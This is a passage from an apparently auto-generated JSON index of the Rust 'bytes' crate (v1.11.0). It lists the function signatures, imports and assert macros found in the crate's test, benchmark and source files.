          "assert_eq!(*bytes, LONG[..]);",
          "assert_eq!(LONG[..], *bytes);",
          "assert_eq!(*bytes, LONG[..]);",
          "assert_eq!(bytes.len(), 10);",
          "assert_eq!(*bytes, LONG[..]);",
          "assert_eq!(a, b\"a\"[..]);",
          "assert_eq!(b, b\"b\"[..]);",
          "assert_eq!(a, &b\"world\"[..]);",
          "assert_eq!(a, b\"o yah world zomg wat wat\"[..]);",
          "assert_eq!(a, b\"h world zomg wat wat\"[..]);",
          "assert_eq!(a, b\"d zomg wat wat\"[..]);",
          "assert_eq!(a, b\"o yah world zomg wat wat\"[..]);",
          "assert_eq!(a, b\"h world zomg wat wat\"[..]);",
          "assert_eq!(a, b\"h world zomg wat wat\"[..]);",
          "assert_eq!(a, b\"d zomg wat wat\"[..]);",
          "let max_capacity = if cfg!(miri) { 16 } else { 256 };",
          "eprintln!(\"testing capacity={capacity}, len={len}, advance={advance}\");",
          "assert_eq!(buf.len(), len, \"resize should write `len` bytes\");",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "const ITERS: usize = if cfg!(miri) { 100 } else { 1_000 };",
          "assert_eq!(*buf, data[..]);",
          "assert!(bytes == bytesmut);",
          "assert!(bytesmut == bytes);",
          "assert!(bytes2 != bytesmut);",
          "assert!(bytesmut != bytes2);",
          "assert_eq!(b\"aaabbb\", &buf[..]);",
          "assert_eq!(b\"cccddd\", &splitted[..]);",
          "assert_eq!(b\"aaabbbcccddd\", &buf[..]);",
          "assert_eq!(b\"aaabbbcccddd\", &buf[..]);",
          "assert_eq!(b\"aaabbbcccddd\", &buf[..]);",
          "assert_eq!(buf.capacity(), 64);",
          "assert_eq!(buf.capacity(), 64);",
          "assert_eq!(b\"aaaabbbbccccdddd\", &buf[..]);",
          "assert_eq!(b\"aaaabbbbccccdddd\", &buf[..]);",
          "assert_eq!(b\"aaaabbbbccccdddd\", &buf[..]);",
          "assert_eq!(&actual[..], &expect[..]);",
          "assert_eq!(&sub[..], expected);",
          "assert_eq!(&sub[..], b\"\");",
          "assert_eq!(Bytes::new(), bytes.slice_ref(slice));",
          "assert_eq!(Bytes::new(), bytes.slice_ref(slice));",
          "assert_eq!(Bytes::new(), bytes.slice_ref(slice));",
          "assert_eq!(1024, bytes.chunk_mut().len());",
          "assert_eq!(1024 - 10, bytes.chunk_mut().len());",
          "assert_eq!(ptr.offset(10), next);",
          "assert_eq!(1024, bytes.chunk_mut().len());",
          "assert_eq!(&buf[0] as *const u8, p);",
          "assert_eq!([17, 19, 19], bytes.as_ref());",
          "assert!(b.is_empty());",
          "assert_eq!(&vec, content);",
          "assert_eq!(&vec, content);",
          "assert_eq!(&vec, content);",
          "assert_eq!(&vec, prefix);",
          "assert_eq!(&*vec, bs);",
          "eprintln!(\"1\");",
          "eprintln!(\"2\");",
          "eprintln!(\"3\");",
          "eprintln!(\"4\");",
          "eprintln!(\"{:#?}\", (&*b1).as_ptr());",
          "eprintln!(\"5\");",
          "assert_eq!(&*Vec::from(b2), bs);",
          "eprintln!(\"6\");",
          "assert_eq!(&*Vec::from(b1), bs);",
          "assert_eq!(Vec::from(b2), bs[9..]);",
          "assert_eq!(Vec::from(b1), bs[..9]);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b2), vec);",
          "assert_eq!(Vec::from(b2), vec[20..]);",
          "assert_eq!(Vec::from(b1), vec[..20]);",
          "assert_eq!(v.len(), 7);",
          "assert_eq!(v.capacity(), 10);",
          "assert_eq!(v.len(), 6);",
          "assert_eq!(v.capacity(), 10);",
          "assert_eq!(v.as_slice(), b\"bcdefg\");",
          "assert_eq!(v.len(), 7);",
          "assert_eq!(v.capacity(), 10);",
          "assert_eq!(v.len(), 6);",
          "assert_eq!(v.capacity(), 10);",
          "assert_eq!(v.as_slice(), b\"bcdefg\");",
          "assert!(!b.is_unique());",
          "assert!(b.is_unique());",
          "assert!(!b.is_unique());",
          "assert!(b.is_unique());",
          "assert!(!c.is_unique());",
          "assert!(c.is_unique());",
          "assert!(!c.is_unique());",
          "assert!(c.is_unique());",
          "assert_eq!(bytes_mut, bs[..]);",
          "assert_eq!(bytes_mut, bs[..]);",
          "assert_eq!(bytes_mut, bs_long[..]);",
          "assert_eq!(b1m, bs[..]);",
          "assert_eq!(b2m, bs[..]);",
          "assert_eq!(b2m, bs[9..]);",
          "assert_eq!(b1m, bs[..9]);",
          "assert_eq!(b1m, vec);",
          "assert_eq!(b1m, vec);",
          "assert_eq!(b1m, vec);",
          "assert_eq!(b2m, vec);",
          "assert_eq!(b2m, vec[20..]);",
          "assert_eq!(b1m, vec[..20]);",
          "assert_eq!(false, buf.try_reclaim(6));",
          "assert_eq!(true, buf.try_reclaim(6));",
          "assert!(cap >= 6);",
          "assert_eq!(false, buf.try_reclaim(cap + 1));",
          "assert!(cap >= 6);",
          "assert_eq!(0, split.capacity());",
          "assert_eq!(true, split.try_reclaim(6));",
          "assert_eq!(false, split.try_reclaim(cap + 1));",
          "assert_eq!(false, buf.try_reclaim(usize::MAX));",
          "assert_eq!(false, buf.try_reclaim(6));",
          "assert_eq!(4, buf.capacity());",
          "assert_eq!(false, buf.try_reclaim(6));",
          "assert_eq!(true, buf.try_reclaim(5));",
          "assert_eq!(true, buf.try_reclaim(6));",
          "assert_eq!(6, buf.capacity());",
          "assert_eq!(false, buf.try_reclaim(usize::MAX));",
          "assert_eq!(false, buf.try_reclaim(6));",
          "assert_eq!(false, buf.try_reclaim(6));",
          "assert_eq!(true, buf.try_reclaim(6));",
          "assert_eq!(6, buf.capacity());",
          "assert_eq!(0, buf.len());",
          "assert_eq!(6, buf.capacity());",
          "assert_eq!(6, buf.len());",
          "assert_eq!(false, buf.try_reclaim(6));",
          "assert_eq!(true, buf.try_reclaim(4));",
          "assert_eq!(true, buf.try_reclaim(6));",
          "assert_eq!(empty_end.len(), 0);",
          "assert_eq!(empty_end.as_ptr(), ptr_end);",
          "assert_eq!(empty_start.len(), 0);",
          "assert_eq!(empty_start.as_ptr(), ptr_start);",
          "assert_eq!(empty_end.len(), 0);",
          "assert_eq!(empty_end.as_ptr(), ptr_end);",
          "assert_eq!(buf.len(), 0);",
          "assert_eq!(buf.as_ptr(), ptr_start);",
          "assert_eq!(empty_start.len(), 0);",
          "assert_eq!(empty_start.as_ptr(), ptr_start);",
          "assert_eq!(buf.len(), 0);",
          "assert_eq!(buf.as_ptr(), ptr_end);",
          "assert_eq!(empty_end.len(), 0);",
          "assert_eq!(empty_end.as_ptr(), ptr_end);",
          "assert_eq!(buf.len(), 0);",
          "assert_eq!(buf.as_ptr(), ptr_start);",
          "assert_eq!(empty_start.len(), 0);",
          "assert_eq!(empty_start.as_ptr(), ptr_start);",
          "assert_eq!(buf.len(), 0);",
          "assert_eq!(buf.as_ptr(), ptr_end);",
          "panic!(\"test-triggered panic in `AsRef<[u8]> for OwnedTester`\");",
          "assert!(!b1.is_unique()); // even if ref_cnt == 1",
          "assert!(!b1.is_unique());",
          "assert!(!b2.is_unique());",
          "assert!(!b2.is_unique()); // even if ref_cnt == 1",
          "assert_eq!(&buf[..], &b1[..]);",
          "assert_eq!(&buf[..], &b2[..]);",
          "assert_eq!(b1.as_ptr(), b2.as_ptr());",
          "assert_eq!(b1.len(), b2.len());",
          "assert_eq!(b1.len(), buf.len());",
          "assert_eq!(SHORT, &b1[..]);",
          "assert_eq!(&SHORT[1..(SHORT.len() - 1)], b2);",
          "assert_eq!(unsafe { SHORT.as_ptr().add(1) }, b2.as_ptr());",
          "assert_eq!(SHORT.len() - 2, b2.len());",
          "assert_eq!(drop_counter.get(), 0);",
          "assert_eq!(drop_counter.get(), 0);",
          "assert_eq!(drop_counter.get(), 0);",
          "assert_eq!(drop_counter.get(), 1);",
          "assert_eq!(new_buf, &buf[..]);",
          "assert_eq!(drop_counter.get(), 1);",
          "assert_eq!(&v1[..], &buf[..]);",
          "assert_eq!(&v1[..], &b1[..]);",
          "assert_eq!(drop_counter.get(), 1);",
          "assert_eq!(&v1[..], &buf[..]);",
          "assert_eq!(drop_counter.get(), 1);",
          "assert!(result.is_err());",
          "assert_eq!(drop_counter.get(), 1);",
          "assert!(capacity >= 1234);",
          "assert_eq!(&[10], bytes_mut.as_ref());",
          "assert_eq!(bytes_mut.capacity(), capacity);"
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Clone)]"
        ],
        "error_handling": 13
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/tests/test_debug.rs",
        "function_defs": [
          "fn fmt() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use bytes::Bytes;"
        ],
        "macros": [
          "assert_eq!(expected, format!(\"{:?}\", Bytes::from(vec)));"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/tests/test_iter.rs",
        "function_defs": [
          "fn iter_len() {",
          "fn empty_iter_len() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use bytes::{buf::IntoIter, Bytes};"
        ],
        "macros": [
          "assert_eq!(iter.size_hint(), (11, Some(11)));",
          "assert_eq!(iter.len(), 11);",
          "assert_eq!(iter.size_hint(), (0, Some(0)));",
          "assert_eq!(iter.len(), 0);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/tests/test_reader.rs",
        "function_defs": [
          "fn read() {",
          "fn buf_read() {",
          "fn get_mut() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::io::{BufRead, Read};",
          "use bytes::Buf;"
        ],
        "macros": [
          "assert_eq!(b\"hello world\", &buffer[..]);",
          "assert_eq!(\"hello\\n\", &line);",
          "assert_eq!(\"world\", &line);",
          "assert_eq!(11, buf_mut.remaining());",
          "assert_eq!(b\"hello world\", buf_mut);"
        ],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/tests/test_bytes_vec_alloc.rs",
        "function_defs": [
          "fn insert(&self, ptr: *mut u8, size: usize) {",
          "fn remove(&self, ptr: *mut u8) -> usize {",
          "fn test_bytes_advance() {",
          "fn test_bytes_truncate() {",
          "fn test_bytes_truncate_and_advance() {",
          "fn invalid_ptr<T>(addr: usize) -> *mut T {",
          "fn test_bytes_into_vec() {"
        ],
        "struct_defs": [
          "struct Ledger {"
        ],
        "impl_blocks": [
          "impl Ledger {"
        ],
        "uses": [
          "use std::alloc::{GlobalAlloc, Layout, System};",
          "use std::ptr::null_mut;",
          "use std::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};",
          "use bytes::{Buf, Bytes};"
        ],
        "macros": [
          "panic!(\"Ledger ran out of space.\");",
          "panic!(\"Couldn't find a matching entry for {:x?}\", ptr);",
          "panic!(",
          "debug_assert_eq!(ptr as usize, addr);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b2), vec);",
          "assert_eq!(Vec::from(b2), vec[20..]);",
          "assert_eq!(Vec::from(b1), vec[..20]);"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/tests/test_limit.rs",
        "function_defs": [
          "fn long_limit() {",
          "fn limit_get_mut() {",
          "fn limit_set_limit() {",
          "fn limit_chunk_mut() {",
          "fn limit_advance_mut_panic_1() {",
          "fn limit_advance_mut_panic_2() {",
          "fn limit_advance_mut() {",
          "fn limit_into_inner() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use bytes::{buf::Limit, BufMut};"
        ],
        "macros": [
          "assert_eq!(10, limit.remaining_mut());",
          "assert_eq!(&[0u8; 10], &limit.get_ref()[..]);",
          "assert_eq!(10, limit.remaining_mut());",
          "assert_eq!(&mut [0u8; 128], &limit.get_mut()[..]);",
          "assert_eq!(10, Limit::limit(&limit));",
          "assert_eq!(5, Limit::limit(&limit));",
          "assert_eq!(10, limit.chunk_mut().len());",
          "assert_eq!(10, limit.chunk_mut().len());",
          "assert_eq!(5, limit.remaining_mut());",
          "assert_eq!(5, limit.chunk_mut().len());",
          "assert_eq!(*dst, b\"llo world\"[..]);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/tests/test_chain.rs",
        "function_defs": [
          "fn collect_two_bufs() {",
          "fn writing_chained() {",
          "fn iterating_two_bufs() {",
          "fn vectored_read() {",
          "fn chain_growing_buffer() {",
          "fn chain_overflow_remaining_mut() {",
          "fn chain_get_bytes() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use bytes::{Buf, BufMut, Bytes};",
          "use std::io::IoSlice;"
        ],
        "macros": [
          "assert_eq!(res, &b\"helloworld\"[..]);",
          "assert_eq!(expect, a[i]);",
          "assert_eq!(expect + 64, b[i]);",
          "assert_eq!(res, &b\"helloworld\"[..]);",
          "assert_eq!(2, buf.chunks_vectored(&mut iovecs));",
          "assert_eq!(iovecs[0][..], b\"hello\"[..]);",
          "assert_eq!(iovecs[1][..], b\"world\"[..]);",
          "assert_eq!(iovecs[2][..], b\"\"[..]);",
          "assert_eq!(iovecs[3][..], b\"\"[..]);",
          "assert_eq!(2, buf.chunks_vectored(&mut iovecs));",
          "assert_eq!(iovecs[0][..], b\"llo\"[..]);",
          "assert_eq!(iovecs[1][..], b\"world\"[..]);",
          "assert_eq!(iovecs[2][..], b\"\"[..]);",
          "assert_eq!(iovecs[3][..], b\"\"[..]);",
          "assert_eq!(1, buf.chunks_vectored(&mut iovecs));",
          "assert_eq!(iovecs[0][..], b\"world\"[..]);",
          "assert_eq!(iovecs[1][..], b\"\"[..]);",
          "assert_eq!(iovecs[2][..], b\"\"[..]);",
          "assert_eq!(iovecs[3][..], b\"\"[..]);",
          "assert_eq!(1, buf.chunks_vectored(&mut iovecs));",
          "assert_eq!(iovecs[0][..], b\"ld\"[..]);",
          "assert_eq!(iovecs[1][..], b\"\"[..]);",
          "assert_eq!(iovecs[2][..], b\"\"[..]);",
          "assert_eq!(iovecs[3][..], b\"\"[..]);",
          "assert_eq!(&buff, b\"hey there1\");",
          "assert_eq!(&vec, b\"wassup23123\");",
          "assert_eq!(chained.remaining_mut(), usize::MAX);",
          "assert_eq!(chained.remaining_mut(), usize::MAX);",
          "assert_eq!(Bytes::copy_from_slice(b\"a\"), a);",
          "assert_eq!(Bytes::copy_from_slice(b\"bc\"), bc);",
          "assert_eq!(Bytes::copy_from_slice(b\"d\"), d);",
          "assert_eq!(ab_ptr, a.as_ptr());",
          "assert_eq!(cd_ptr.wrapping_offset(1), d.as_ptr());"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/tests/test_serde.rs",
        "function_defs": [
          "fn test_ser_de_empty() {",
          "fn test_ser_de() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use serde_test::{assert_tokens, Token};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/tests/test_buf_mut.rs",
        "function_defs": [
          "fn test_vec_as_mut_buf() {",
          "fn test_vec_put_bytes() {",
          "fn test_put_u8() {",
          "fn test_put_u16() {",
          "fn test_put_int() {",
          "fn test_put_int_nbytes_overflow() {",
          "fn test_put_int_le() {",
          "fn test_put_int_le_nbytes_overflow() {",
          "fn test_vec_advance_mut() {",
          "fn test_clone() {",
          "fn do_test_slice_small<T: ?Sized>(make: impl Fn(&mut [u8]) -> &mut T)",
          "fn do_test_slice_large<T: ?Sized>(make: impl Fn(&mut [u8]) -> &mut T)",
          "fn do_test_slice_put_slice_panics<T: ?Sized>(make: impl Fn(&mut [u8]) -> &mut T)",
          "fn do_test_slice_put_bytes_panics<T: ?Sized>(make: impl Fn(&mut [u8]) -> &mut T)",
          "fn test_slice_buf_mut_small() {",
          "fn test_slice_buf_mut_large() {",
          "fn test_slice_buf_mut_put_slice_overflow() {",
          "fn test_slice_buf_mut_put_bytes_overflow() {",
          "fn make_maybe_uninit_slice(slice: &mut [u8]) -> &mut [MaybeUninit<u8>] {",
          "fn test_maybe_uninit_buf_mut_small() {",
          "fn test_maybe_uninit_buf_mut_large() {",
          "fn test_maybe_uninit_buf_mut_put_slice_overflow() {",
          "fn test_maybe_uninit_buf_mut_put_bytes_overflow() {",
          "fn test_deref_bufmut_forwards() {",
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {",
          "fn put_u8(&mut self, _: u8) {",
          "fn write_byte_panics_if_out_of_bounds() {",
          "fn copy_from_slice_panics_if_different_length_1() {",
          "fn copy_from_slice_panics_if_different_length_2() {",
          "fn test_bytes_mut_reuse() {"
        ],
        "struct_defs": [
          "struct Special;"
        ],
        "impl_blocks": [],
        "uses": [
          "use bytes::buf::UninitSlice;",
          "use bytes::{BufMut, BytesMut};",
          "use core::fmt::Write;",
          "use core::mem::MaybeUninit;"
        ],
        "macros": [
          "assert_eq!(buf.remaining_mut(), isize::MAX as usize);",
          "assert!(buf.chunk_mut().len() >= 64);",
          "assert_eq!(&buf, b\"zomg\");",
          "assert_eq!(buf.remaining_mut(), isize::MAX as usize - 4);",
          "assert_eq!(buf.capacity(), 64);",
          "assert_eq!(buf.len(), 68);",
          "assert_eq!([17, 19, 19], &buf[..]);",
          "assert_eq!(b\"\\x21\", &buf[..]);",
          "assert_eq!(b\"\\x21\\x54\", &buf[..]);",
          "assert_eq!(b\"\\x54\\x21\", &buf[..]);",
          "assert_eq!(b\"\\x60\\x70\\x80\", &buf[..]);",
          "assert_eq!(b\"\\x80\\x70\\x60\", &buf[..]);",
          "assert!(buf != buf2);",
          "assert_eq!(2, slice.remaining_mut());",
          "assert_eq!(b\"AABBCCXX\", &buf[..]);",
          "assert_eq!(4, slice.remaining_mut());",
          "assert_eq!(b\"abcdCCXX\", &buf[..]);",
          "assert_eq!(4, slice.remaining_mut());",
          "assert_eq!(b\"3210CCXX\", &buf[..]);",
          "assert_eq!(buf_len - fill_len, slice.remaining_mut());",
          "assert_eq!(&FILL[..fill_len], head);",
          "assert!(tail.iter().all(|b| *b == b'X'));",
          "unreachable!(\"remaining_mut\");",
          "unreachable!(\"chunk_mut\");",
          "unreachable!(\"advance\");"
        ],
        "derives": [],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/tests/test_take.rs",
        "function_defs": [
          "fn long_take() {",
          "fn take_copy_to_bytes() {",
          "fn take_copy_to_bytes_panics() {",
          "fn take_chunks_vectored() {",
          "fn chain() -> impl Buf {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use bytes::buf::Buf;",
          "use bytes::Bytes;"
        ],
        "macros": [
          "assert_eq!(11, buf.remaining());",
          "assert_eq!(b\"hello world\", buf.chunk());",
          "assert_eq!(Bytes::copy_from_slice(b\"a\"), a);",
          "assert_eq!(abcd_ptr, a.as_ptr());",
          "assert_eq!(Bytes::copy_from_slice(b\"bcd\"), abcd);",
          "assert_eq!(take.chunks_vectored(&mut dst), 0);",
          "assert_eq!(take.chunks_vectored(&mut dst), 1);",
          "assert_eq!(&*dst[0], &[1]);",
          "assert_eq!(take.chunks_vectored(&mut dst), 1);",
          "assert_eq!(&*dst[0], &[1, 2, 3]);",
          "assert_eq!(take.chunks_vectored(&mut dst), 2);",
          "assert_eq!(&*dst[0], &[1, 2, 3]);",
          "assert_eq!(&*dst[1], &[4]);",
          "assert_eq!(take.chunks_vectored(&mut dst), 2);",
          "assert_eq!(&*dst[0], &[1, 2, 3]);",
          "assert_eq!(&*dst[1], &[4, 5, 6]);",
          "assert_eq!(take.chunks_vectored(&mut dst), 2);",
          "assert_eq!(&*dst[0], &[1, 2, 3]);",
          "assert_eq!(&*dst[1], &[4, 5, 6]);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/benches/buf.rs",
        "function_defs": [
          "fn new(buf: &'static [u8], readlens: &'static [usize], init_pos: usize) -> TestBuf {",
          "fn reset(&mut self) {",
          "fn next_readlen(&mut self) {",
          "fn remaining(&self) -> usize {",
          "fn advance(&mut self, cnt: usize) {",
          "fn chunk(&self) -> &[u8] {",
          "fn new(buf: &'static [u8], readlens: &'static [usize], init_pos: usize) -> TestBufC {",
          "fn reset(&mut self) {",
          "fn remaining(&self) -> usize {",
          "fn advance(&mut self, cnt: usize) {",
          "fn chunk(&self) -> &[u8] {",
          "fn $fname(b: &mut Bencher) {",
          "fn $fname(b: &mut Bencher) {",
          "fn $fname(b: &mut Bencher) {"
        ],
        "struct_defs": [
          "struct TestBuf {",
          "struct TestBufC {"
        ],
        "impl_blocks": [
          "impl TestBuf {",
          "impl Buf for TestBuf {",
          "impl TestBufC {",
          "impl Buf for TestBufC {"
        ],
        "uses": [
          "use bytes::Buf;",
          "use test::Bencher;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;"
        ],
        "macros": [
          "assert!(self.pos <= self.buf.len());",
          "bench!(slice, slice, $method $(,$arg)*);",
          "bench!(tbuf_1,        testbuf TestBuf  &[],  $method $(,$arg)*);",
          "bench!(tbuf_1_costly, testbuf TestBufC &[],  $method $(,$arg)*);",
          "bench!(tbuf_2,        testbuf TestBuf  &[1], $method $(,$arg)*);",
          "bench!(tbuf_2_costly, testbuf TestBufC &[1], $method $(,$arg)*);",
          "// bench!(tbuf_onebyone,        testbuf TestBuf  &[1,1,1,1,1,1,1,1], $method $(,",
          "// bench!(tbuf_onebyone_costly, testbuf TestBufC &[1,1,1,1,1,1,1,1], $method $(,",
          "bench_group!(get_u8);",
          "bench_group!(get_u16);",
          "bench_group!(get_u32);",
          "bench_group!(get_u64);",
          "bench_group!(get_f32);",
          "bench_group!(get_f64);",
          "bench_group!(get_uint, 3);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/benches/bytes_mut.rs",
        "function_defs": [
          "fn alloc_small(b: &mut Bencher) {",
          "fn alloc_mid(b: &mut Bencher) {",
          "fn alloc_big(b: &mut Bencher) {",
          "fn deref_unique(b: &mut Bencher) {",
          "fn deref_unique_unroll(b: &mut Bencher) {",
          "fn deref_shared(b: &mut Bencher) {",
          "fn deref_two(b: &mut Bencher) {",
          "fn clone_frozen(b: &mut Bencher) {",
          "fn alloc_write_split_to_mid(b: &mut Bencher) {",
          "fn drain_write_drain(b: &mut Bencher) {",
          "fn fmt_write(b: &mut Bencher) {",
          "fn bytes_mut_extend(b: &mut Bencher) {",
          "fn put_slice_bytes_mut(b: &mut Bencher) {",
          "fn put_u8_bytes_mut(b: &mut Bencher) {",
          "fn put_slice_vec(b: &mut Bencher) {",
          "fn put_u8_vec(b: &mut Bencher) {",
          "fn put_slice_vec_extend(b: &mut Bencher) {",
          "fn put_u8_vec_push(b: &mut Bencher) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use bytes::{BufMut, BytesMut};",
          "use test::Bencher;",
          "use std::fmt::Write;"
        ],
        "macros": [
          "let _ = write!(buf, \"{}\", s);"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/benches/bytes.rs",
        "function_defs": [
          "fn deref_unique(b: &mut Bencher) {",
          "fn deref_shared(b: &mut Bencher) {",
          "fn deref_static(b: &mut Bencher) {",
          "fn clone_static(b: &mut Bencher) {",
          "fn clone_shared(b: &mut Bencher) {",
          "fn clone_arc_vec(b: &mut Bencher) {",
          "fn from_long_slice(b: &mut Bencher) {",
          "fn slice_empty(b: &mut Bencher) {",
          "fn slice_short_from_arc(b: &mut Bencher) {",
          "fn split_off_and_drop(b: &mut Bencher) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use bytes::Bytes;",
          "use test::Bencher;",
          "use std::sync::Arc;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/serde.rs",
        "function_defs": [
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn visit_seq<V>(self, mut seq: V) -> Result<Self::Value, V::Error>",
          "fn visit_bytes<E>(self, v: &[u8]) -> Result<Self::Value, E>",
          "fn visit_byte_buf<E>(self, v: Vec<u8>) -> Result<Self::Value, E>",
          "fn visit_str<E>(self, v: &str) -> Result<Self::Value, E>",
          "fn visit_string<E>(self, v: String) -> Result<Self::Value, E>",
          "fn deserialize<D>(deserializer: D) -> Result<$ty, D::Error>"
        ],
        "struct_defs": [
          "struct $visitor_ty;"
        ],
        "impl_blocks": [
          "impl Serialize for $ty {"
        ],
        "uses": [
          "use super::{Bytes, BytesMut};",
          "use alloc::string::String;",
          "use alloc::vec::Vec;",
          "use core::{cmp, fmt};",
          "use serde::{de, Deserialize, Deserializer, Serialize, Serializer};"
        ],
        "macros": [
          "serde_impl!(Bytes, BytesVisitor, copy_from_slice, from);",
          "serde_impl!(BytesMut, BytesMutVisitor, from, from_vec);"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/bytes_mut.rs",
        "function_defs": [
          "fn reserve_inner(&mut self, additional: usize, allocate: bool) -> bool {",
          "fn as_slice(&self) -> &[u8] {",
          "fn as_slice_mut(&mut self) -> &mut [u8] {",
          "fn try_unsplit(&mut self, other: BytesMut) -> Result<(), BytesMut> {",
          "fn kind(&self) -> usize {",
          "fn drop(&mut self) {",
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn advance(&mut self, cnt: usize) {",
          "fn copy_to_bytes(&mut self, len: usize) -> Bytes {",
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {",
          "fn put<T: Buf>(&mut self, mut src: T)",
          "fn put_slice(&mut self, src: &[u8]) {",
          "fn put_bytes(&mut self, val: u8, cnt: usize) {",
          "fn as_ref(&self) -> &[u8] {",
          "fn deref(&self) -> &[u8] {",
          "fn as_mut(&mut self) -> &mut [u8] {",
          "fn deref_mut(&mut self) -> &mut [u8] {",
          "fn from(src: &'a [u8]) -> BytesMut {",
          "fn from(src: &'a str) -> BytesMut {",
          "fn from(src: BytesMut) -> Bytes {",
          "fn eq(&self, other: &BytesMut) -> bool {",
          "fn partial_cmp(&self, other: &BytesMut) -> Option<cmp::Ordering> {",
          "fn cmp(&self, other: &BytesMut) -> cmp::Ordering {",
          "fn default() -> BytesMut {",
          "fn hash<H>(&self, state: &mut H)",
          "fn borrow(&self) -> &[u8] {",
          "fn borrow_mut(&mut self) -> &mut [u8] {",
          "fn write_str(&mut self, s: &str) -> fmt::Result {",
          "fn write_fmt(&mut self, args: fmt::Arguments<'_>) -> fmt::Result {",
          "fn clone(&self) -> BytesMut {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn extend<T>(&mut self, iter: T)",
          "fn extend<T>(&mut self, iter: T)",
          "fn extend<T>(&mut self, iter: T)",
          "fn from_iter<T: IntoIterator<Item = u8>>(into_iter: T) -> Self {",
          "fn from_iter<T: IntoIterator<Item = &'a u8>>(into_iter: T) -> Self {",
          "fn is_unique(&self) -> bool {",
          "fn original_capacity_to_repr(cap: usize) -> usize {",
          "fn original_capacity_from_repr(repr: usize) -> usize {",
          "fn test_original_capacity_to_repr() {",
          "fn test_original_capacity_from_repr() {",
          "fn eq(&self, other: &[u8]) -> bool {",
          "fn partial_cmp(&self, other: &[u8]) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &BytesMut) -> bool {",
          "fn partial_cmp(&self, other: &BytesMut) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &str) -> bool {",
          "fn partial_cmp(&self, other: &str) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &BytesMut) -> bool {",
          "fn partial_cmp(&self, other: &BytesMut) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Vec<u8>) -> bool {",
          "fn partial_cmp(&self, other: &Vec<u8>) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &BytesMut) -> bool {",
          "fn partial_cmp(&self, other: &BytesMut) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &String) -> bool {",
          "fn partial_cmp(&self, other: &String) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &BytesMut) -> bool {",
